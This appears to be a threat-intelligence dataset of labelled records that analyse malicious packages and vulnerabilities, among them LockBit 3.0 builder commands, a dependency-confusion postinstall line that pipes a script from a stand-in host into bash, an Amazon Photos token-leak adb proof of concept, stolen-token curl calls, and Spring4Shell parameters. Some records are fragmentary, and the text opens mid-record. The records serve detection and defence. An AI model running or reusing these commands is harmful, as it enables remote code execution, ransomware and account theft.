attack_chain.leads_to: Freed memory region in the kernel heap that previously contained unprivileged credentials.

attack_chain.action: Attacker reallocates the freed memory with a privileged credential object, causing the process to inherit elevated privileges.
attack_chain.leads_to: Process now operates with privileged credentials, enabling local privilege escalation or container escape.

behavioral_signatures: User process unexpectedly gains root or elevated privileges without corresponding authorization events
Kernel heap memory reuse patterns involving credential objects following use-after-free or double-free errors
Kernel log entries indicating use-after-free or double-free exploitation attempts targeting credential structures
Abnormal process privilege transitions not associated with legitimate system calls (e.g., setuid, sudo)
file_indicators: No specific file indicators; detection relies on monitoring kernel memory management and process privilege transitions
network_indicators: None specific to this exploit; the attack is local and does not involve network communication
detection_knowledge.how_to_detect: Monitor kernel logs for use-after-free or double-free errors involving credential structures, track abnormal privilege escalation events in user processes, and analyze kernel heap allocation patterns for suspicious credential object reuse. Employ kernel hardening, memory isolation, and runtime integrity monitoring to detect and prevent unauthorized credential swapping via heap exploitation.

package_info.why_malicious: The LockBit 3.0 Builder is a ransomware construction kit that enables attackers to generate custom ransomware payloads. It automates the creation of encryptors and decryptors, manages cryptographic key generation, and provides configuration options for targeted file encryption, process and service termination, and C2 communication. Its sole purpose is to facilitate the deployment of ransomware attacks, making it inherently malicious and a direct threat to victims.

malicious_snippets.code_snippet:
Keygen.exe -path <output_folder> -pubkey <public_key_file> -privkey <private_key_file>
Builder.exe -type enc -config <config.json> -exe -pass <password> -pubkey <public_key_file> -ofile <encryptor_output>
malicious_snippets.code_behavior: At build-time, the script invokes Keygen.exe to generate an RSA key pair and then executes Builder.exe with attacker-supplied configuration to create a custom ransomware encryptor, resulting in a deployable ransomware payload.

malice_analysis.why_suspicious: The automated generation of cryptographic keys and the creation of ransomware encryptors are core functions of malware toolkits, enabling attackers to rapidly produce unique ransomware samples.
malice_analysis.violated_expectations: Legitimate build scripts do not generate ransomware encryptors or manage cryptographic keys for the purpose of file encryption and extortion.
malice_analysis.similar_legitimate_use: Legitimate software may automate cryptographic key generation for secure communications or code signing, but not for the purpose of encrypting user files for ransom.
key_indicators: Automated invocation of Keygen.exe for RSA key generation
Execution of Builder.exe with attacker-controlled configuration to produce ransomware payloads
Presence of build scripts that output encryptors and decryptors

execution_context.trigger: runtime (on victim machine, after execution of encryptor)

malicious_snippets.code_behavior: At runtime, the ransomware payload terminates specified processes and services, iterates through the filesystem to encrypt files not on exclusion lists, writes a ransom note to affected directories, and optionally communicates with attacker-controlled C2 servers to exfiltrate the decryption ID.

malice_analysis.why_suspicious: The combination of mass process/service termination, bulk file encryption with exclusion logic, ransom note creation, and C2 communication is characteristic of ransomware operations.
malice_analysis.violated_expectations: Legitimate software does not indiscriminately encrypt user files, terminate unrelated processes/services, or demand ransom from users.
malice_analysis.similar_legitimate_use: Backup or security software may terminate specific processes/services for updates or maintenance, but never for the purpose of encrypting user data and extorting payment.
key_indicators: Bulk file encryption with configurable exclusion lists
Automated creation of ransom note files in affected directories
Termination of processes and services to maximize file access and disrupt recovery
Outbound network communication to attacker-controlled C2 infrastructure

execution_context.trigger: runtime (during key generation for each victim)
execution_context.file_location: Keygen.exe (used during build, but also logic present in ransomware payload for victim identification)

malicious_snippets.code_snippet:
// Pseudocode for key generation
seed = rdrand()
csprng = strong_init(seed)
p = strong_bigdig(csprng, 512)
q = strong_bigdig(csprng, 512)
N = p * q
e = 65537
d = modinv(e, (p-1)*(q-1))
public_key = (e, N)
private_key = (d, N)
decryption_id = random(16 bytes)
write_to_file(public_key, private_key, decryption_id)
malicious_snippets.code_behavior: At build-time, the code uses hardware-based random number generation to create a unique RSA-1024 key pair and a 16-byte decryption ID for each ransomware instance, enabling per-victim encryption and unique identification for ransom payment.

malice_analysis.why_suspicious: Generating unique cryptographic keys and decryption IDs for each victim is a technique used by ransomware to prevent universal decryption and enforce individualized ransom payments.
malice_analysis.violated_expectations: Legitimate software rarely generates per-instance cryptographic keys for the purpose of locking user data and extorting payment.
malice_analysis.similar_legitimate_use: Secure messaging or backup applications may generate per-user or per-session keys for privacy, but not for the purpose of denying access to user data.
key_indicators: Use of hardware RNG (rdrand) for cryptographic key generation
Per-victim generation of RSA key pairs and decryption IDs
Writing of key material and victim identifiers to files for later use in ransom operations

detection_knowledge.how_to_detect: Monitor for rapid, bulk process and service termination events followed by high-volume file encryption and the creation of ransom notes with LockBit-specific content. Analyze outbound network traffic for connections to known or suspicious C2 domains specified in configuration files, and for exfiltration of decryption IDs. Use file hashes, YARA rules, and behavioral analytics to identify builder components and generated ransomware payloads.

package_info.why_malicious: The package is malicious because it intentionally declares dependencies on thousands of other packages, causing any installation to recursively download nearly every package in the npm registry. This results in a denial-of-service (DoS) condition by exhausting disk space, bandwidth, and system resources. Additionally, by listing nearly every package as a dependency, it exploits npm's dependency policy to prevent other developers from unpublishing their own packages, effectively locking the ecosystem and causing widespread disruption.

malicious_snippets.code_snippet:
"dependencies": {
  "@everything-registry/chunk-1": "^1.0.0",
  "@everything-registry/chunk-2": "^1.0.0",
  "@everything-registry/chunk-3": "^1.0.0",
  "@everything-registry/chunk-4": "^1.0.0",
  "@everything-registry/chunk-5": "^1.0.0"
}
malicious_snippets.code_behavior: At install-time, the npm client reads the package.json dependencies field, recursively resolves and downloads all listed '@everything-registry/chunk-*' packages, resulting in a massive transitive dependency tree and causing system resource exhaustion.

malice_analysis.why_suspicious: Declaring dependencies on thousands of packages, especially using a systematic chunking pattern, is highly abnormal and serves no legitimate development purpose. This behavior is designed to overwhelm the dependency resolver and the system.
malice_analysis.violated_expectations: Normal packages declare only the dependencies they actually use, typically a small, relevant set. Here, the package intentionally pulls in nearly the entire registry, which is not expected or necessary for any legitimate use case.
malice_analysis.similar_legitimate_use: Some meta-packages aggregate a handful of related packages for convenience, but never at this scale or with auto-generated chunked names.
key_indicators: Dependencies field lists hundreds or thousands of packages
Dependency names follow a chunking or numeric pattern (e.g., '@everything-registry/chunk-*')
No actual code or functionality beyond dependency aggregation
package.json is the only file present or contains no meaningful code

malicious_snippets.code_behavior: At install-time, each chunk package's package.json declares hundreds of dependencies, including other chunk packages and unrelated legitimate npm packages, causing the npm client to recursively fetch and install a massive number of packages, leading to resource exhaustion.

malice_analysis.why_suspicious: Chunk packages recursively depend on hundreds of other packages, including legitimate third-party packages unrelated to the author, which is not a standard or necessary practice. This recursive structure is designed to maximize the dependency tree and disrupt the ecosystem.
malice_analysis.violated_expectations: Normal chunking or meta-packages aggregate a small, related set of dependencies. Here, the intent is to maximize the dependency tree for disruptive purposes, not for any functional benefit.
malice_analysis.similar_legitimate_use: Some frameworks provide a 'batteries-included' meta-package, but these are curated, limited in scope, and do not recursively depend on unrelated third-party packages.
key_indicators: Recursive dependency chains across chunked packages
Dependencies on unrelated, legitimate packages not authored by the package maintainer
No actual code or exports in the chunk packages
package.json files with hundreds of dependencies in each chunk

detection_knowledge.how_to_detect: Monitor for packages whose package.json dependencies field lists an abnormally high number of dependencies (e.g., more than 100). Flag packages that recursively depend on auto-generated or chunked package names, especially if they aggregate unrelated third-party packages. Alert on install events that trigger thousands of network requests to the npm registry in a short period. Use static analysis to detect meta-packages with no actual code but excessive dependencies. Correlate install events with system resource exhaustion or npm registry download spikes.

package_info.why_malicious: The affected versions of the Spring Framework contain a critical remote code execution (RCE) vulnerability (Spring4Shell/CVE-2022-22965). This vulnerability allows attackers to exploit the parameter binding mechanism to write arbitrary fields to the file system via crafted HTTP requests, potentially leading to full system compromise. The threat is due to a severe security flaw, not intentionally malicious code, but it enables malicious exploitation by attackers.

execution_context.file_location: Java source code in Spring Controller classes using the @InitBinder annotation

malicious_snippets.code_behavior: At HTTP request processing time, the code configures the WebDataBinder to disallow binding of request parameters matching 'class.*', 'Class.*', '*.class.*', or '*.Class.*', preventing attacker-supplied HTTP parameters from modifying sensitive class-related fields, which blocks exploitation of the parameter binding vulnerability.

malice_analysis.why_suspicious: The absence of this code, or incomplete disallowed fields, leaves the application vulnerable to parameter binding attacks. Attackers can supply specially crafted HTTP parameters to manipulate internal class properties, enabling remote code execution.
malice_analysis.violated_expectations: Normally, parameter binding should restrict modification of internal class metadata and prevent arbitrary field injection. When these protections are missing or incomplete, the application fails to enforce expected security boundaries, allowing attackers to write to sensitive fields.
malice_analysis.similar_legitimate_use: Legitimate use of @InitBinder and setDisallowedFields is to enforce input validation and restrict user input for security and data integrity, preventing users from binding to sensitive or internal fields.
key_indicators: Lack of or incomplete setDisallowedFields configuration for 'class' and 'Class' in WebDataBinder
Ability to bind arbitrary fields via HTTP parameters targeting class-related properties
Presence of @InitBinder methods without sufficient field restrictions

attack_chain.action: Attacker sends crafted HTTP requests with parameters targeting class-related fields (e.g., class.module.classLoader.resources.context.parent.pipeline.first.pattern).
attack_chain.leads_to: Parameter binding mechanism processes attacker-supplied fields.

attack_chain.action: Spring's parameter binding mechanism, if not properly restricted, allows writing to arbitrary fields, including those controlling file paths and log patterns.
attack_chain.leads_to: Attacker can write a web shell or arbitrary file to the server.

attack_chain.action: Attacker achieves remote code execution by accessing the uploaded web shell or executing arbitrary code via the manipulated fields.
attack_chain.leads_to: Full system compromise.

behavioral_signatures: HTTP requests containing parameters such as 'class.module.classLoader.resources.context.parent.pipeline.first.pattern', 'classLoader', or other class-related field names
Unusual parameter binding to class-related fields in Spring applications, especially those not expected in normal application logic
Unexpected file creation or modification in web root or application directories following HTTP requests with suspicious parameters
file_indicators: Presence of web shells or unauthorized JSP files in web application directories (e.g., /webapps/ROOT/)
Unexpected changes to configuration or log files (such as web.xml, logging configuration) via HTTP requests
network_indicators: Inbound HTTP requests with suspicious parameter names (e.g., 'class', 'Class', 'pattern', 'suffix', 'classLoader')
Outbound connections from the application server to external or attacker-controlled hosts, especially after web shell upload or execution
detection_knowledge.how_to_detect: Monitor HTTP request logs for parameters targeting class-related fields, especially those matching 'class.*', 'Class.*', '*.class.*', or '*.Class.*'. Audit application code for the presence and correct use of setDisallowedFields in @InitBinder methods. Watch for unexpected file creation or modification in web application directories, and scan for web shells or unauthorized JSP files. Deploy WAF rules to block suspicious parameter patterns and alert on attempts to bind to class-related fields. Correlate file system changes with suspicious HTTP requests to identify exploitation attempts.

package_info.why_malicious: The package is part of a coordinated mass-flooding campaign targeting the npm registry. It publishes hundreds of thousands of functionally useless or near-empty packages, which strains registry infrastructure, risks denial-of-service (DoS) conditions, and pollutes the open source ecosystem. The packages are interlinked via dependencies, amplifying the impact and complicating removal, and may serve as a smokescreen for more targeted malicious activity or to exploit blockchain-based reward systems.

malicious_snippets.code_behavior: At import-time, the code statically references hardcoded blockchain addresses in a JavaScript file, with no functional logic or data processing, resulting in no operational effect but potentially linking the package to blockchain-based reward systems.

malice_analysis.why_suspicious: Including hardcoded blockchain addresses in a file that otherwise contains no functional code is highly atypical and suggests the package may be used to game blockchain-based reward systems, act as a placeholder for future malicious payloads, or serve as a marker for automated reward collection.
malice_analysis.violated_expectations: A legitimate npm package, especially one purporting to be an ESLint plugin, is expected to provide actual linting or utility functionality. Instead, this package is empty or contains only references to unrelated blockchain addresses, which is inconsistent with normal package development practices.
malice_analysis.similar_legitimate_use: Some legitimate packages may include blockchain addresses for donation or configuration purposes, but not in the absence of all other meaningful functionality or code.

malice_analysis.why_suspicious: Declaring a large number of interlinked dependencies with no functional purpose is a classic technique for creating dependency hell, exhausting system and registry resources, and complicating package removal. This behavior is designed to amplify the impact of the package flood and disrupt normal registry operations.
malice_analysis.violated_expectations: Legitimate packages declare only necessary dependencies that provide actual functionality. Here, dependencies are used solely to create a web of interlinked, functionally empty packages, which is not a standard or acceptable practice.
malice_analysis.similar_legitimate_use: Some meta-packages aggregate many plugins or modules, but not at this scale and not with dependencies that are themselves empty or non-functional.

package_info.why_malicious: The package contains a vulnerability (CVE-2023-37460) that allows attackers to exploit archive extraction by creating symlinks that point outside the intended extraction directory. When a malicious archive is processed, this flaw enables arbitrary file creation or modification outside the extraction root, potentially leading to remote code execution, privilege escalation, or unauthorized access. The vulnerability is present in all versions prior to 4.8.0.

malicious_snippets.code_behavior: During archive extraction, the code checks if the archive entry specifies a symlink destination, creates a symbolic link at the target location if so, or writes the entry's content to the resolved file path; this data flow allows crafted symlinks to redirect file writes outside the intended extraction directory, resulting in arbitrary file creation or modification.

malice_analysis.why_suspicious: This code enables the creation of symlinks based on archive entries without verifying that the symlink target remains within the extraction directory, allowing attackers to craft archives that create or overwrite files outside the intended directory.
malice_analysis.violated_expectations: Normal archive extraction should strictly confine all file and symlink creation to the extraction directory, regardless of archive content. Here, the lack of symlink target validation violates this expectation and enables directory traversal.
malice_analysis.similar_legitimate_use: Legitimate extraction tools may support symlink restoration, but must enforce that symlinks do not point outside the extraction root to prevent security risks.
key_indicators: Symlink creation directly from archive entry metadata
No validation of symlink target path against extraction root
File writes may follow symlinks to locations outside extraction directory

malicious_snippets.code_behavior: During archive extraction, the code attempts to resolve the canonical path of the target file and checks if it is within the extraction directory; however, if the symlink's target does not exist, the canonical path check is bypassed, allowing file creation outside the extraction directory, resulting in a security bypass.

malice_analysis.why_suspicious: The path validation logic relies on File.getCanonicalFile(), which does not resolve non-existent symlink targets, allowing attackers to bypass directory restrictions and write files outside the extraction directory.
malice_analysis.violated_expectations: Path validation should prevent any file writes outside the extraction directory, including cases involving symlinks to non-existent files. This logic fails to enforce that guarantee.
malice_analysis.similar_legitimate_use: Canonical path checks are a common defense, but must be implemented to account for symlink edge cases and non-existent targets.
key_indicators: Use of getCanonicalFile() for path validation
Directory restriction bypass via symlink to non-existent file
Lack of robust path traversal protection in extraction logic

The use of obfuscation to conceal static secrets is a common tactic among malicious packages, and legitimate packages should never embed API keys in code, especially in an obfuscated form.

malice_analysis.violated_expectations: Legitimate packages should never store sensitive API keys directly in source code, especially not in an obfuscated form. Proper secret management requires using environment variables or secure secret management solutions.
malice_analysis.similar_legitimate_use: Obfuscation may be used in legitimate software to protect proprietary algorithms or reduce code size, but it is not appropriate for hiding static API keys or secrets.

Static storage of VirusTotal API keys in package code
Decoding logic that reveals sensitive information at import-time

Its ability to download and execute further payloads makes it highly dangerous and adaptable.

Flag packages that access browser credential stores or transmit data to Discord webhooks. Detect process enumeration and termination targeting analysis/debugging tools, and registry or system spec checks indicative of anti-analysis behavior. Network monitoring should alert on connections to known Discord webhook endpoints and suspicious binary downloads from cdn.discordapp.com.

package_info.package_versions: 1.0.0 (malicious public version, higher than private/local version)
package_info.why_malicious: The package is malicious because it exploits dependency confusion by using the same name as a legitimate private/local dependency. By publishing a higher version number to the public npm registry, it is selected over the intended internal package. Upon installation, it executes arbitrary code with the application's privileges, enabling remote code execution and potential system compromise. The package is intentionally crafted to override the legitimate dependency and deliver a payload from an attacker-controlled server.

malicious_snippets.code_snippet: require('child_process').exec('curl -s http://malicious.example.com/payload.sh | bash');
malicious_snippets.code_behavior: During installation (postinstall), the code invokes child_process.exec to execute a shell command that downloads a remote shell script from http://malicious.example.com/payload.sh using curl, pipes it to bash for execution, and runs the script with the application's privileges, resulting in remote code execution.

malice_analysis.why_suspicious: The code executes a shell command during the postinstall phase to fetch and run a script from an external, attacker-controlled domain. This behavior is a strong indicator of malware, as it allows the attacker to execute arbitrary code on the victim's system without consent.
malice_analysis.violated_expectations: Legitimate npm packages should not execute arbitrary remote code during installation. Postinstall scripts are typically used for setup or build steps, not for downloading and running untrusted code from external sources.
malice_analysis.similar_legitimate_use: Some legitimate packages use postinstall scripts to compile native modules or download required binaries from trusted, official sources. However, these actions are well-documented, use secure endpoints, and do not execute unverified code from untrusted domains.
key_indicators: Use of child_process.exec to run shell commands during installation
Fetching and executing code from an external, non-official domain (http://malicious.example.com)
No user interaction or consent required for code execution
Presence of a postinstall script in package.json that initiates network activity

attack_chain.action: Attacker publishes a malicious package named 'cordova-harness-client' to the public npm registry with a higher version number than the private/local version.

file_indicators: package.json containing suspicious or undocumented postinstall scripts

Flag packages with names matching internal/private dependencies that appear in public registries, especially if they have higher version numbers. Review package.json scripts for unexpected or undocumented postinstall actions, and audit network traffic for suspicious outbound connections to non-official domains during dependency installation.

package_info.package_versions: Prior to Dec 18, 2021 (exact versions not specified, but all before the fix)
package_info.why_malicious: The app's misconfigured exported activity (ThorViewActivity) allowed any other app or attacker to trigger an HTTP request containing the user's Amazon access token to an attacker-controlled server, resulting in full compromise of Amazon account data and files. This enabled exfiltration of authentication tokens and subsequent unauthorized access to the user's Amazon Drive.

execution_context.trigger: At runtime, when ThorViewActivity is launched via an external intent from any app or user action.

malicious_snippets.code_snippet:
<activity
  android:label="@ref/0x7f1300ee"
  android:name="com.amazon.gallery.thor.app.activity.ThorViewActivity"
  android:configChanges="0x4a0">
  <intent-filter>
    <action android:name="android.intent.action.VIEW"/>
    <category android:name="android.intent.category.DEFAULT"/>
    <category android:name="android.intent.category.BROWSABLE"/>
    <data android:scheme="http"/>
    <data android:scheme="https"/>
    <data android:scheme="content"/>
    <data android:scheme="file"/>
    <data android:mimeType="video/*"/>
    <data android:mimeType="application/sdp"/>
    <data android:mimeType="application/vnd.apple.mpegurl"/>
    <data android:mimeType="application/x-mpegurl"/>
  </intent-filter>
</activity>
malicious_snippets.code_behavior: At runtime, when an external app or user sends an intent with a crafted URI, the exported ThorViewActivity is launched, the app processes the attacker-supplied URL, and initiates an HTTP request to the specified destination, resulting in the potential leakage of sensitive authentication tokens to untrusted servers.

malice_analysis.why_suspicious: Exported activities with broad intent-filters accepting arbitrary schemes allow untrusted apps to trigger sensitive operations, exposing the app to intent-based attacks.
malice_analysis.violated_expectations: Normal Android app design restricts sensitive activities to internal use or requires explicit permissions; here, the activity is open to all apps without restriction, enabling untrusted input to drive sensitive network actions.
malice_analysis.similar_legitimate_use: Exported activities are sometimes used for sharing non-sensitive data between trusted apps, but not for operations involving authentication tokens or user data.
key_indicators: Exported activity with android.intent.action.VIEW and android.intent.category.BROWSABLE
Intent-filter accepts http, https, file, and content schemes
No android:exported="false" or permission restrictions on the activity
Activity processes arbitrary URIs from external sources

execution_context.trigger: At runtime, when ThorViewActivity is triggered with a crafted intent containing a malicious URL.
execution_context.file_location: App runtime (triggered by intent, not directly visible in code; can be invoked via adb or another app)

malicious_snippets.code_snippet:
adb shell am start \
  -n 'com.amazon.clouddrive.photos/com.amazon.gallery.thor.app.activity.ThorViewActivity' \
  -d 'https://YOUR_MALICIOUS_SERVER.COM/poc.mp4' \
  -t video/mp4
malicious_snippets.code_behavior: At runtime, a malicious app or attacker uses adb to send an intent to ThorViewActivity with a malicious URL, the app processes the intent and initiates an HTTP request to the attacker-controlled server, resulting in the exposure of sensitive headers including the user's Amazon access token.

malice_analysis.why_suspicious: Allows any app or user with adb access to trigger the app to make network requests to arbitrary destinations, potentially leaking sensitive authentication tokens.
malice_analysis.violated_expectations: Normal behavior is to restrict such intents to trusted sources or validate the destination before making network requests; here, no such validation is performed.
malice_analysis.similar_legitimate_use: adb is used for debugging and testing, but in production, exported activities should not process untrusted input for sensitive operations.
key_indicators: Intent can be sent by any app or via adb
Destination server is attacker-controlled and not validated
No user interaction required to trigger sensitive network request

execution_context.trigger: At runtime, when the app processes the malicious intent and makes an HTTP request to the attacker-controlled server.
execution_context.file_location: App runtime (HTTP request generated by app, observable in network traffic; not directly visible in static code)

malicious_snippets.code_snippet:
GET /poc.mp4 HTTP/1.1
x-amz-access-token: <user's Amazon access token>
User-Agent: PhotosAndroid/1.46.0-80254410g (Linux;Android 11) ExoPlayerLib/2.9.0
Accept-Encoding: identity
Host: <attacker's server>
Connection: Keep-Alive
malicious_snippets.code_behavior: At runtime, after receiving a crafted intent, the app constructs and sends an HTTP request to the attacker-controlled server, includes the user's Amazon access token in the x-amz-access-token header, and transmits it over the network, resulting in credential exfiltration.

malice_analysis.why_suspicious: Sensitive authentication tokens are transmitted to an untrusted, attacker-controlled domain, enabling theft of user credentials.
malice_analysis.violated_expectations: Normal behavior is to only send authentication tokens to trusted Amazon endpoints; sending them to arbitrary domains is a critical security violation.
malice_analysis.similar_legitimate_use: Legitimate requests to Amazon APIs may include such headers, but never to non-Amazon or user-supplied domains.
key_indicators: x-amz-access-token header present in HTTP request to non-Amazon domain
Request initiated as a result of external intent
Sensitive token transmitted over the network to attacker infrastructure

execution_context.trigger: After exfiltration, when the attacker uses the stolen token to access Amazon Drive APIs.
execution_context.file_location: External (attacker's system, using curl or similar tools to access Amazon APIs)

malicious_snippets.code_snippet:
curl -k 'https://cdws.us-east-1.amazonaws.com/drive/v1/nodes' -H 'x-amz-access-token: <the-token>'
curl -k 'https://content-na.drive.amazonaws.com/cdproxy/v1/nodes/<node-id>/content' -H 'x-amz-access-token: <the-token>'
malicious_snippets.code_behavior: After exfiltration, the attacker uses the stolen Amazon access token to send API requests to Amazon Drive endpoints, accesses, modifies, or deletes the victim's files and personal data, resulting in full account compromise.

malice_analysis.why_suspicious: Use of a stolen authentication token to access a victim's cloud storage is a clear indicator of account takeover and data breach.
malice_analysis.violated_expectations: Only the legitimate user or trusted apps should access these APIs with valid tokens; access from unknown IPs or after token exfiltration is abnormal.
malice_analysis.similar_legitimate_use: Legitimate API access by the user or trusted apps, but not from attacker infrastructure or after token theft.
key_indicators: API access from IPs or devices not associated with the user
Bulk or unusual file operations following token exfiltration
Use of valid x-amz-access-token from attacker-controlled systems

attack_chain.action: A malicious app or attacker sends a crafted intent to the exported ThorViewActivity with an attacker-controlled URL, exploiting the exported activity's broad intent-filter.
attack_chain.leads_to: The app processes the intent and makes an HTTP request to the attacker-controlled server.

attack_chain.action: The app sends an HTTP request to the attacker-controlled server, including the user's Amazon access token in the x-amz-access-token header.
attack_chain.leads_to: The attacker receives the Amazon access token.

attack_chain.action: The attacker uses the stolen token to access, modify, or delete the victim's Amazon Drive files and personal data via Amazon APIs.
attack_chain.leads_to: Full compromise of the victim's Amazon account and data.

behavioral_signatures: Exported Android activities with VIEW and BROWSABLE intent-filters accepting http, https, file, or content schemes without permission restrictions
App-initiated HTTP requests containing x-amz-access-token header sent to non-Amazon domains
Unusual or bulk Amazon Drive API access from IPs or devices not previously associated with the user, especially following suspicious app activity
file_indicators: AndroidManifest.xml: exported activities (android:exported="true" or implicit export in pre-Android 12) with intent-filters for VIEW/BROWSABLE and broad URI schemes
App code that constructs HTTP requests with x-amz-access-token header to arbitrary, user-supplied URLs
network_indicators: HTTP requests from the app to non-Amazon domains containing x-amz-access-token header
Amazon Drive API calls from IP addresses or devices not associated with the legitimate user, especially after suspicious app activity
Outbound connections to domains or IPs not on the Amazon allowlist immediately after app activity
detection_knowledge.how_to_detect: Monitor AndroidManifest.xml for exported activities with broad VIEW/BROWSABLE intent-filters and no permission restrictions. Inspect app network traffic for HTTP requests containing x-amz-access-token headers sent to non-whitelisted domains. Correlate Amazon Drive API access logs for unusual activity from new IPs or devices following suspicious app activity. Alert on any instance where authentication tokens are transmitted to non-Amazon endpoints.
